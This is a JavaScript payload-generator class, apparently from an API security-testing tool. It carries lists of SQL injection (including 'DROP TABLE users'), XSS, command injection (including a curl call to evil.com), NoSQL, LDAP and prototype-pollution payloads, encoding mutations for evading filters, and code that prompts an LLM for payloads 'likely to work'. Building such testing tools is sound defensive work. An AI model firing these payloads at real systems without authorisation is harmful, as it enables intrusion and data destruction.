/**
 * AI-Powered Payload Generator
 * Generates intelligent, context-aware payloads for API security testing
 */

class PayloadGenerator {
  constructor(aiProvider, apiKey) {
    this.aiProvider = aiProvider;
    this.apiKey = apiKey;
    this.payloadTemplates = new Map();
    this.contextCache = new Map();
    this.initializeTemplates();
  }

  initializeTemplates() {
    // Base payload templates for different vulnerability types
    this.payloadTemplates.set('sql_injection', {
      basic: ["' OR '1'='1", "1' OR '1'='1", "admin'--", "' OR 1=1#"],
      advanced: ["' UNION SELECT * FROM information_schema.tables--", "1; DROP TABLE users--"],
      blind: ["' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--"],
      time_based: ["' AND (SELECT SLEEP(5))--", "1; WAITFOR DELAY '00:00:05'--"]
    });

    this.payloadTemplates.set('xss', {
      basic: ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"],
      advanced: ["<svg onload=alert('XSS')>", "javascript:alert('XSS')"],
      dom: ["<iframe src=javascript:alert('XSS')>", "<body onload=alert('XSS')>"],
      encoded: ["%3Cscript%3Ealert('XSS')%3C/script%3E", "&#60;script&#62;alert('XSS')&#60;/script&#62;"]
    });

    this.payloadTemplates.set('idor', {
      basic: ["1", "2", "999999", "0", "-1"],
      advanced: ["admin", "../1", "../../1", "1' OR '1'='1"],
      uuid: ["00000000-0000-0000-0000-000000000000", "ffffffff-ffff-ffff-ffff-ffffffffffff"],
      encoded: ["%31", "%32", "%2e%2e%2f%31"]
    });

    this.payloadTemplates.set('command_injection', {
      basic: ["; ls -la", "| whoami", "`id`"],
      advanced: ["$(curl http://evil.com)", "`curl http://evil.com`"],
      windows: ["; dir", "| type C:\\windows\\system32\\drivers\\etc\\hosts"],
      encoded: ["%3B%20ls%20-la", "%7C%20whoami"]
    });

    this.payloadTemplates.set('ldap_injection', {
      basic: ["*)(uid=*))(|(uid=*", "*)(|(password=*))"],
      advanced: ["*)(|(objectClass=*))", "admin)(&(password=*))"],
      blind: ["*)(|(cn=*))", "*)(|(mail=*))"]
    });

    this.payloadTemplates.set('nosql_injection', {
      basic: ['{"$where":"this.password == this.username"}', '{"$ne":null}'],
      advanced: ['{"$or":[{"username":"admin"},{"password":"admin"}]}', '{"$regex":".*"}'],
      blind: ['{"$exists":true}', '{"$gt":""}']
    });
  }

  async generatePayloads(endpoint, method, vulnerabilityType, context = {}) {
    const payloads = [];

    // Get base templates
    const templates = this.payloadTemplates.get(vulnerabilityType) || {};
    const basePayloads = Object.values(templates).flat();

    // Add base payloads
    payloads.push(...basePayloads);

    // Generate AI-powered payloads if AI is available
    if (this.aiProvider && this.apiKey) {
      try {
        const aiPayloads = await this.generateAIPayloads(endpoint, method, vulnerabilityType, context);
        payloads.push(...aiPayloads);
      } catch (error) {
        console.error('AI payload generation failed:', error);
      }
    }

    // Generate context-aware payloads
    const contextPayloads = this.generateContextAwarePayloads(endpoint, method, vulnerabilityType, context);
    payloads.push(...contextPayloads);

    // Apply mutations
    const mutatedPayloads = this.applyMutations(payloads, vulnerabilityType);
    payloads.push(...mutatedPayloads);

    // Remove duplicates and return
    return [...new Set(payloads)].slice(0, 50); // Limit to 50 payloads
  }

  async generateAIPayloads(endpoint, method, vulnerabilityType, context) {
    const prompt = this.buildAIPrompt(endpoint, method, vulnerabilityType, context);
    
    try {
      const aiResponse = await this.callAI(prompt);
      if (aiResponse) {
        return this.parseAIPayloads(aiResponse);
      }
    } catch (error) {
      console.error('AI payload generation failed:', error);
    }

    return [];
  }

  buildAIPrompt(endpoint, method, vulnerabilityType, context) {
    const contextInfo = context.response ? `Response: ${context.response.substring(0, 200)}...` : '';
    const headersInfo = context.headers ? `Headers: ${JSON.stringify(context.headers)}` : '';
    
    return `Generate 10 advanced security testing payloads for ${vulnerabilityType} vulnerability.

Endpoint: ${method} ${endpoint}
Context: ${contextInfo}
${headersInfo}

Requirements:
1. Payloads should be specific to ${vulnerabilityType}
2. Consider the endpoint context and method
3. Include both basic and advanced techniques
4. Consider different encoding methods
5. Include edge cases and boundary conditions
6. Make payloads realistic and likely to work

Return only the payloads, one per line, without explanations or formatting.`;
  }

  async callAI(prompt) {
    if (this.aiProvider === 'openai') {
      return await this.callOpenAI(prompt);
    } else if (this.aiProvider === 'gemini') {
      return await this.callGemini(prompt);
    }
    return null;
  }

  async callOpenAI(prompt) {
    const response = await fetch('https://api.openai.com/v1/chat/completions', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${this.apiKey}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        model: 'gpt-4',
        messages: [
          {
            role: 'system',
            content: 'You are a security testing AI that generates payloads for API security testing. Generate only payloads without explanations.'
          },
          {
            role: 'user',
            content: prompt
          }
        ],
        temperature: 0.8,
        max_tokens: 800
      })
    });

    if (response.ok) {
      const data = await response.json();
      return data.choices[0].message.content;
    }
    return null;
  }

  async callGemini(prompt) {
    const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=${this.apiKey}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        contents: [{
          parts: [{
            text: prompt
          }]
        }]
      })
    });

    if (response.ok) {
      const data = await response.json();
      return data.candidates[0].content.parts[0].text;
    }
    return null;
  }

  parseAIPayloads(aiResponse) {
    const payloads = [];
    const lines = aiResponse.split('\n');
    
    for (const line of lines) {
      const payload = line.trim();
      if (payload && !payload.startsWith('#') && !payload.startsWith('//')) {
        payloads.push(payload);
      }
    }

    return payloads;
  }

  generateContextAwarePayloads(endpoint, method, vulnerabilityType, context) {
    const payloads = [];

    // Extract context information
    const pathParams = this.extractPathParameters(endpoint);
    const queryParams = this.extractQueryParameters(endpoint);
    const responseContent = context.response || '';

    // Generate payloads based on context
    if (pathParams.length > 0) {
      payloads.push(...this.generatePathParameterPayloads(pathParams, vulnerabilityType));
    }

    if (queryParams.length > 0) {
      payloads.push(...this.generateQueryParameterPayloads(queryParams, vulnerabilityType));
    }

    if (method === 'POST' || method === 'PUT' || method === 'PATCH') {
      payloads.push(...this.generateBodyPayloads(vulnerabilityType, responseContent));
    }

    if (responseContent.includes('admin') || responseContent.includes('user')) {
      payloads.push(...this.generateRoleBasedPayloads(vulnerabilityType));
    }

    if (responseContent.includes('error') || responseContent.includes('exception')) {
      payloads.push(...this.generateErrorBasedPayloads(vulnerabilityType));
    }

    return payloads;
  }

  extractPathParameters(endpoint) {
    const matches = endpoint.match(/\{([^}]+)\}/g);
    return matches ? matches.map(match => match.slice(1, -1)) : [];
  }

  extractQueryParameters(endpoint) {
    const queryMatch = endpoint.match(/\?([^#]+)/);
    if (!queryMatch) return [];
    
    const queryString = queryMatch[1];
    const params = queryString.split('&');
    return params.map(param => param.split('=')[0]);
  }

  generatePathParameterPayloads(pathParams, vulnerabilityType) {
    const payloads = [];
    
    for (const param of pathParams) {
      if (vulnerabilityType === 'idor') {
        payloads.push('1', '2', '999999', 'admin', 'test');
      } else if (vulnerabilityType === 'sql_injection') {
        payloads.push("1' OR '1'='1", "1; DROP TABLE users--", "1' UNION SELECT * FROM users--");
      } else if (vulnerabilityType === 'xss') {
        payloads.push("<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>");
      }
    }

    return payloads;
  }

  generateQueryParameterPayloads(queryParams, vulnerabilityType) {
    const payloads = [];
    
    for (const param of queryParams) {
      if (vulnerabilityType === 'sql_injection') {
        payloads.push(`?${param}=' OR '1'='1`, `?${param}=1; DROP TABLE users--`);
      } else if (vulnerabilityType === 'xss') {
        payloads.push(`?${param}=<script>alert('XSS')</script>`, `?${param}=<img src=x onerror=alert('XSS')>`);
      } else if (vulnerabilityType === 'idor') {
        payloads.push(`?${param}=1`, `?${param}=999999`, `?${param}=admin`);
      }
    }

    return payloads;
  }

  generateBodyPayloads(vulnerabilityType, responseContent) {
    const payloads = [];

    if (vulnerabilityType === 'mass_assignment') {
      payloads.push(
        '{"role":"admin","isAdmin":true}',
        '{"__proto__":{"isAdmin":true}}',
        '{"constructor":{"prototype":{"isAdmin":true}}}'
      );
    } else if (vulnerabilityType === 'sql_injection') {
      payloads.push(
        '{"id":"1\' OR \'1\'=\'1"}',
        '{"name":"admin\'--"}',
        '{"query":"1; DROP TABLE users--"}'
      );
    } else if (vulnerabilityType === 'xss') {
      payloads.push(
        '{"name":"<script>alert(\'XSS\')</script>"}',
        '{"description":"<img src=x onerror=alert(\'XSS\')>"}'
      );
    }

    return payloads;
  }

  generateRoleBasedPayloads(vulnerabilityType) {
    const payloads = [];

    if (vulnerabilityType === 'authorization') {
      payloads.push(
        '{"role":"admin"}',
        '{"role":"superuser"}',
        '{"role":"root"}',
        '{"isAdmin":true}',
        '{"privileges":["admin","super_user"]}'
      );
    }

    return payloads;
  }

  generateErrorBasedPayloads(vulnerabilityType) {
    const payloads = [];

    if (vulnerabilityType === 'sql_injection') {
      payloads.push(
        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
        "1' AND (SELECT SLEEP(5))--",
        "' UNION SELECT 1,2,3,4,5--"
      );
    }

    return payloads;
  }

  applyMutations(payloads, vulnerabilityType) {
    const mutations = [];

    for (const payload of payloads) {
      // URL encoding
      mutations.push(encodeURIComponent(payload));
      
      // Double URL encoding
      mutations.push(encodeURIComponent(encodeURIComponent(payload)));
      
      // Unicode encoding
      if (payload.length < 100) {
        mutations.push(payload.replace(/</g, '\u003c').replace(/>/g, '\u003e'));
      }
      
      // Base64 encoding
      try {
        mutations.push(Buffer.from(payload).toString('base64'));
      } catch (e) {
        // Skip if not valid for base64
      }
      
      // HTML entity encoding
      mutations.push(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
      
      // Case variations
      mutations.push(payload.toUpperCase());
      mutations.push(payload.toLowerCase());
      
      // Quote variations
      mutations.push(payload.replace(/'/g, '"'));
      mutations.push(payload.replace(/"/g, "'"));
    }

    return mutations.slice(0, 20); // Limit mutations
  }

  // Generate payloads for specific OWASP API Top 10 vulnerabilities
  async generateOWASPPayloads(vulnerabilityId, endpoint, method, context = {}) {
    const vulnerabilityMap = {
      'api1': 'idor',
      'api2': 'authentication',
      'api3': 'information_disclosure',
      'api4': 'rate_limiting',
      'api5': 'authorization',
      'api6': 'mass_assignment',
      'api7': 'security_misconfiguration',
      'api8': 'sql_injection',
      'api9': 'asset_management',
      'api10': 'logging_monitoring'
    };

    const vulnerabilityType = vulnerabilityMap[vulnerabilityId] || 'general';
    return await this.generatePayloads(endpoint, method, vulnerabilityType, context);
  }

  // Generate payloads based on response analysis
  async generateResponseBasedPayloads(endpoint, method, response, statusCode, headers) {
    const context = { response, statusCode, headers };
    const payloads = [];

    // Analyze response to determine vulnerability types to test
    const vulnerabilityTypes = this.analyzeResponseForVulnerabilities(response, statusCode);

    for (const vulnType of vulnerabilityTypes) {
      const vulnPayloads = await this.generatePayloads(endpoint, method, vulnType, context);
      payloads.push(...vulnPayloads);
    }

    return [...new Set(payloads)];
  }

  analyzeResponseForVulnerabilities(response, statusCode) {
    const vulnerabilities = [];

    if (response.includes('mysql') || response.includes('sql') || response.includes('database')) {
      vulnerabilities.push('sql_injection');
    }

    if (response.includes('<script>') || response.includes('javascript:')) {
      vulnerabilities.push('xss');
    }

    if (statusCode === 401 || response.includes('unauthorized')) {
      vulnerabilities.push('authentication');
    }

    if (statusCode === 403 || response.includes('forbidden')) {
      vulnerabilities.push('authorization');
    }

    if (response.includes('error') || response.includes('exception')) {
      vulnerabilities.push('information_disclosure');
    }

    if (statusCode === 429 || response.includes('rate limit')) {
      vulnerabilities.push('rate_limiting');
    }

    return vulnerabilities.length > 0 ? vulnerabilities : ['general'];
  }

  // Cache context for future use
  cacheContext(endpoint, context) {
    this.contextCache.set(endpoint, {
      ...context,
      timestamp: Date.now()
    });
  }

  // Get cached context
  getCachedContext(endpoint) {
    const cached = this.contextCache.get(endpoint);
    if (cached && Date.now() - cached.timestamp < 300000) { // 5 minutes
      return cached;
    }
    return null;
  }
}

module.exports = PayloadGenerator;
